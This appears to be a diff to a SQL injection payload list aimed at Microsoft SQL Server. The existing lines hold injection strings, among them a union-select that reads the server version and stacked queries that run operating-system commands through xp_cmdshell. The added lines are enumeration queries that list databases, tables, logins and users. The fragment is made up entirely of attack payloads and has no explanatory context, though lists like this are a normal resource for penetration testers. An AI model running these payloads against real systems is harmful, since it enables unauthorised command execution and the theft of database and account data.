@@ -14,4 +14,11 @@
 ' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
 '; exec master..xp_cmdshell 'ping 10.10.1.2'--
 '; exec master..xp_cmdshell 'ping 172.10.1.255'--
+SELECT @@version;
+SELECT @@servername;
+SELECT name FROM master..sysdatabases;
+SELECT name FROM sysobjects WHERE xtype='U';
+SELECT loginname FROM master..syslogins;
+SELECT name FROM sysusers;
+SELECT * FROM information_schema.tables;
 
